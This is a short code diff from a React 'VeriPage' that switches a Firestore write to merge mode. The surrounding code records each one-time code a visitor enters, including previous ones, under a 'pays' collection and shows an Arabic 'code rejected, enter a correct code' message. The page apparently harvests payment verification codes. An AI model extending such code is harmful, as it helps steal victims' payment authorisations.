@@ -102,7 +102,7 @@ export default function VeriPage() {
               updates.oldOtp = data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp]
             }
             
-            setDoc(doc(db, "pays", visitorID), updates).then(() => {
+            setDoc(doc(db, "pays", visitorID), updates, { merge: true }).then(() => {
               _ss5("pending")
               _s5("") // Clear the old code
               setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
